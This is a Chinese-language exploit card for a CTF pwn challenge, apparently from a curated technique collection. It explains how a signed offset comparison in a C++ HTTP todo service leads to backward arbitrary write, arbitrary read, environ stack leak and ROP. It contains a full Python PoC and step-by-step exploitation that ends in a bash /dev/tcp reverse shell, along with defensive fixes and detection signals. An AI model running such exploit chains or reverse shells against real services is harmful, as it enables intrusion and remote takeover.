---
id: binary-pwn-heap-cpp-http-todo-negative-offset-backward-write-arbitrary-rw-rop
title: C++ HTTP 待办服务的 PUT 偏移量用有符号比较：负偏移绕过边界检查形成向后任意写，改 content 指针拿任意读写，leak heap/libc/stack 后覆写栈返回地址 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: cpp-http-negative-offset-backward-write-arbitrary-rw-rop
aliases:
- 负偏移向后写
- offset 有符号比较绕过
- PUT /todos 任意写
- content 指针劫持
- environ 泄栈
- 栈返回地址 ROP
- 自定义分配器 todo 结构
tags:
- pwn
- heap
- cpp
- http
- signed-comparison
- negative-offset
- arbitrary-write
- arbitrary-read
- stack-leak
- environ
- rop
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W3
  verified_at: '2026-11-08T19:34:16+08:00'
  notes: 已对照原文核对（含 sub_29550 反编译的 a3 有符号比较、sub_293E4 的 content+offset 指针运算、PUT/GET 路由与 exp 流程）；本次核对未读取图片；原文远程环境未能验证、栈偏移靠枚举多个 libc.base-offset 命中，卡片已如实标注为本地成功/远程未验证并给 confidence medium；原文 exp 的 context(arch='i386') 遗留写法与 p64/pop rdi 不一致处卡片已注明；原文未给受影响版本区间，未设 affected_versions；未执行文中命令/PoC，未访问文中 URL
---

## 一句话结论

一个用 C++ 写的 HTTP 待办服务把「在 content 的哪个偏移处写入」的偏移量按**有符号整数**和缓冲区长度比较，传入负数时 `offset >= size` 判假、`size - offset` 又变成很大的正数，于是「内容太长」检查也通过，`memcpy(content + offset, data, len)` 实际落在 content **之前**，形成向后（低地址）任意写；用它改掉另一个 todo 的 `content` 指针即获得任意地址读，先泄 heap、再劫 `content` 读 `environ` 泄栈，最后把 ROP 链写进那块可控堆并覆盖栈上返回地址，`system(\"bash -c ...\")` 反弹 shell。

## 原理

- **结构布局**：每个 todo 是一块自定义分配器管理的内存，头部近似 `{char *content; int _if_size; int size; char *todo_author;}`，`+0` 是内容指针、`+8` 是容量；`POST /todos` 带 `size` 参数申请并登记，返回自增 id，`GET /todos/<id>` 把 `content` 当字符串打出，`PUT /todos/<id>[/<offset>]` 在 `content + offset` 处覆盖写入。
- **有符号比较是根因**：写入前先做 `if (a3 >= *(_DWORD *)(a1 + 8)) throw Invalid offset;`，`a3` 是 `signed int`，`size` 也是 `int`。传 `0xFFFFFFC0`（即 -0x40）时 `-64 >= 0x80000` 为假，检查被绕过。
- **第二个检查也被绕过**：随后 `v9 = *(_DWORD *)(a1 + 8) - a3;` 是 `int` 运算，`size - (-64)` 变成一个更大的正数，`if (v9 < std::string::size(a2))` 判假，于是「内容太长」也放行。
- **落点计算**：`dest = sub_293E4(a1, (unsigned int)a3)`，虽然形参转成 `unsigned`，但内部做的是 `content + offset` 的指针算术，负数偏移在 64 位下按补码解释成「往回退 0x40 字节」，`memcpy` 就写到 content 之前——正好是这块内存的 chunk 头/相邻结构，可以精确改写 `content` 指针本身或前一块的元数据。
- **为什么要先改指针再读**：`GET /todos/<id>` 把 `content` 指向的 8~N 字节当响应体返回，所以只要能把 `content` 改成任意地址，就有了任意地址读；把 `content` 改到 unsorted/大 chunk 中的 libc 指针位置可泄 libc，改到 `libc.sym['environ']` 可泄栈地址。
- **为什么要再加一次任意写**：改完 `content` 之后，`PUT /todos/<id>/0` 就是「在任意地址写」，可以先把 ROP 链和命令串写进事先准备好、地址已知的堆块；再用同样的手法把栈上某个返回地址改成 `leave;ret`/`libc.base - 0x8ef938` 一类的目标位置，等路由处理函数返回时触发 ROP。
- **成立前提**：能访问 HTTP 接口（注册/登录拿到会话即可）、`PUT` 的 offset 参数可由 URL 传入且未被 `isdigit` 之类过滤、堆上能申请到足够大且地址可推断的块（作者用 0x80000 + 两个 0x200 的固定申请顺序来稳定布局）。

## 触发条件

- 目标服务暴露 `/register`、`/login`、`/todos` 系列路由（写操作走 POST/PUT/DELETE，读走 GET），且需要登录（先用注册+登录拿 Cookie）。
- `PUT /todos/<id>/<offset>` 的 offset 接受负数（`-1`、`0xFFFFFFC0` 十进制形式 `4294967232` 或 `-64`）。
- 自定义分配器的 `size` 字段与 offset 用同一 `int` 比较，且 `memcpy` 前没有 `offset < 0` 判断。
- 进程的栈地址可通过 `environ` 泄露，且崩溃/异常不会让服务重启丢失已布置的堆内容（或能在同一进程生命周期内完成整链）。

## 利用步骤

1. **建号登录**：`POST /register`（`username`/`password`），再 `POST /login`，保存返回的 Cookie；后续 `/todos` 请求都带它，否则 403 Unauthorized。
2. **布置堆布局**：`POST /todos` 依次申请 `0x80000`、`0x200`、`0x200`（返回 id 1/2/3），让大块、两块小块相邻，便于后面用固定偏移推算地址。
3. **验证负偏移**：`PUT /todos/1/-64` 带单字节 `0x40`，在调试器里确认 `memcpy` 的 `dest` 从 `content` 变成 `content - 0x40`（原文实测 `0x...f570 → 0x...f530`）。
4. **泄 heap**：用上一步改到的那一字节让 `GET /todos/1` 的返回值变成堆指针（或直接读 chunk 头的 fd/相邻指针），`u64(resp[len(\"Todo content: \"):].ljust(8, b\"\\x00\"))`。
5. **泄 libc**：`PUT /todos/1/-16` 写入 `p64(heap - 0x270)` 把 `content` 指到一块含有 libc 指针的堆区域，再 `GET /todos/1` 读出 `main_arena` 相关指针，按已知偏移算 libc 基址。
6. **泄栈**：`PUT /todos/1/0` 写入 `p64(libc.sym['environ'])` 把 `content` 指向 `environ`，`GET /todos/0`（或 /1）读出栈地址，减去固定偏移得到可控栈帧位置。
7. **布置 ROP 与命令**：`PUT /todos/2/0` 写入 `bash -c \"...\"` 反弹命令串；`PUT /todos/0/0` 把 `pop rdi; ret` + 命令串地址 + `system` 写进 id 0 的大块里（该块地址已由 heap 泄漏算出）。
8. **覆写返回地址**：用 `PUT /todos/1/0` 把目标栈槽改成指向 ROP 链的位置（原文用 `libc.address - 0x8ef938` / `- 0xee938` 这类基于 libc 的相对值，覆盖多个候选偏移以提高命中率），路由处理函数返回时跳进 ROP。
9. **触发并交互**：再发一次正常请求让栈帧返回，等反弹 shell 连回（原文本地成功，远程因环境未验证）。

## PoC

```python
# 关键片段：负偏移越界写 → 改 content 指针 → 任意读 → ROP
import requests
from pwn import u64, p64

url = "http://127.0.0.1:9999"
s = requests.Session()
s.post(url + "/register", data={"username": "AAAAA", "password": "123456"})
s.post(url + "/login",    data={"username": "AAAAA", "password": "123456"})

for size in (0x80000, 0x200, 0x200):        # 布置 1/2/3 三块
    s.post(url + "/todos", data={"size": size})

# offset = -0x40：绕过 a3 >= size 与 size - a3 < len 两道有符号检查
s.put(url + "/todos/1/{}".format((-0x40) & 0xffffffff), data=b"\x40")

heap = u64(s.get(url + "/todos/1").text[len("Todo content: "):].ljust(8, b"\x00"))

# 把 content 指针改到含 libc 指针的位置，再读出来
s.put(url + "/todos/1/{}".format((-0x10) & 0xffffffff), data=p64(heap - 0x270))
libc_addr = u64(s.get(url + "/todos/1").text[len("Todo content: "):].ljust(8, b"\x00"))

# content 指向 environ，读出栈地址
s.put(url + "/todos/1/0", data=p64(libc.sym["environ"]))
stack = u64(s.get(url + "/todos/0").text[len("Todo content: "):].ljust(8, b"\x00"))

# 命令串 + ROP 链写进可控堆块，再覆写栈返回地址
s.put(url + "/todos/2/0", data=b'bash -c "sh -i >& /dev/tcp/127.0.0.1/2333 0>&1"')
pop_rdi = 0x10f75b + libc.address
s.put(url + "/todos/0/0", data=p64(pop_rdi + 1) + p64(pop_rdi)
                            + p64(heap + 0x270) + p64(libc.sym["system"]))
s.put(url + "/todos/1/0", data=p64(libc.address - 0x8ef938))   # 命中栈上目标槽
```

说明：最后一步的栈偏移与 `heap ± 0xNNN` 的具体值取决于目标 libc 与堆布局，原文是枚举多个 `libc.base - offset` 候选（如 `0x8ef938`、`0xee938`）逐个尝试命中；`context(arch='i386')` 是原文脚本的遗留写法，实际用了 `p64` 与 `pop rdi`，按 64 位理解。

## 变体与关联

- **负偏移变体**：`-1`、`INT_MIN`、`0xFFFFFFFF`；若只过滤 `'-'`，可用十进制大数（`4294967232`）或十六进制/科学计数法表达同一负数；若 offset 是 32 位而指针是 64 位，注意符号扩展行为（`(int)`→`(long)` 会保留符号，得到负偏移；`(unsigned)`→`(long)` 则不）。
- **合法写入面变体**：除 `PUT` 偏移外，`DELETE /todos/<id>` 的 id 若也被当偏移/索引用于指针算术，可形成同类越界；`POST /todos` 的 `size` 若为负可触发巨型分配或长度回绕。
- **任意读写到手后的路线**：`environ` 泄栈 + ROP（本卡）、改 GOT/`.fini_array` 打 hook（有 `__free_hook` 的低版本）、改 `content` 指向自身结构做自引用伪造、直接读 `/proc/self/maps` 之类的敏感文件。
- **同类根因**：所有「用户可控偏移 + 有符号比较 + 指针算术」的模式，包括图片解析器/数据库页/自定义分配器的 `seek`-`write` 接口；与「负索引越界」属同一族。
- **关联**：[[binary-pwn-heap-bitmap-negative-index-backward-arbitrary-bit-write]]（同为负下标/负偏移向后写，但落点是位图位运算，需要先构造 unsorted bin）、[[binary-pwn-heap-cpp-animal-edit-size-mismatch-environ-onegadget]]（C++ 容器编辑长度不校验 + `environ` 泄栈 + one_gadget）。
- **边界**：远程不可达/进程重启会清空堆上布置；栈偏移依赖 libc 版本与编译优化，需要多候选尝试；若服务对 offset 做了 `isdigit` 校验或 `unsigned` 比较，本链不成立。

## 检测与防御

- **代码层**：offset 用 `size_t`/`unsigned` 或显式 `if (offset < 0 || offset >= size)`；用 `size - offset` 之前先判 `offset <= size`；改用 `memcpy_s`/`std::span` 带边界视图；让编译器告警 `-Wsign-compare` 并把 `-Werror` 打开。
- **接口层**：URL 里的偏移参数按无符号解析并限制上界；对 `PUT` 的写入长度与偏移做服务端一致性校验；敏感路由强制鉴权（本例 `/todos` 只是登录即可，任意注册用户都能触发）。
- **运行层**：启用 ASLR（本例能打是因为先泄了 libc/heap/stack，ASLR 本身不是防线）、`FORTIFY_SOURCE`、栈保护；把服务放进崩溃即重启的容器可缩短可利用窗口，但挡不住稳定利用。
- **检测信号**：同一会话对 `/todos/<id>/<超大或负数>` 的 PUT；短时间内大量 4xx/5xx（`Invalid offset`、`Content too long` 探测）；响应体出现非预期的 8 字节二进制（任意读探测）；进程执行 `bash -c`、出现外连反弹端口。
